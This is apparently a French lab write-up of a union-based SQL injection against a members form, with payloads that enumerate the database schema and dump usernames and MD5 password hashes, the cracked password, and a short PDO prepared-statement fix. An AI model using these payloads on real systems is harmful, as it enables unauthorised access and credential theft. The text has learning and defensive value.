# SQL INJECTION ADMIN MEMBERS

## Etape 1: detection de la faille sql


Dans le formulaire des members, taper la commande suivante:
```
1'
```
Cela teste si le formulaire contient une erreur Mysql.


## Etape 2: detection de la version mySql
Pour connaitre la version de mysql, il suffit de taper la commande suivante:
```
1 or 1=1 union all select 1,convert(@@version using latin1)
```
On s'apercois que la version est > 5, si la version est < 5, alors il va falloir deviner les tables, ce aui n'est pas le cas ici.
Pour cela on a besoin de information_schema, il contient toutes les tables et colonnes de la base de données.


## Etape 3: DETECTION DES TABLES
Pour avoir le schema de la BDD et les noms de ses tables, on utilisent table_schema et  table_name

```
1 or 1=1 union all select table_schema, table_name from information_schema.tables
```
On demande a avoir le shema de la base de donée c'est a dire toute les tables qui sont liée avec differents utilisateurs ainsi que les noms des tables.
Ce qui nous interresent c'est la table Members_Brute_Force liée avec la table db_default.

## Etape 4: DETECTION DES COLUMNS


```
1 or 1=1 union all select table_name, column_name from information_schema.columns
```
On s'apercoit que la column username et password dependent de la table db_default.

## Etape 5: EXPLOIT

Le script d'exploit ressemblera alors a:

```
1 or 1=1 union all select password, username from Member_Brute_Force.db_default

```
root et admin on le meme hash md5: 3bf1114a986ba87ed28fc1b5884fc2f8, il faut decrypter le hash, cela correspond a shadow.
Il suffit maintenant de se connecter avec root ou admin.


## Comment s'en premunir ?

Utiliser la programmation php PDO et utilisé des requetes préparées. exemple:  

```
<?php

// On récupère les variables envoyées par le formulaire
$login = $_POST['login'];
$password = $_POST['password'];

// Connexion à la BDD en PDO
try { $bdd = new PDO('mysql:host=localhost;dbname=bdd','root',''); }
catch (Exeption $e) { die('Erreur : ' .$e->getMessage())  or die(print_r($bdd->errorInfo())); }

// Requête SQL sécurisée
$req = $bdd->prepare("SELECT * FROM utilisateurs WHERE login= ? AND password= ?");
$req->execute(array($login, $password));

?>

```
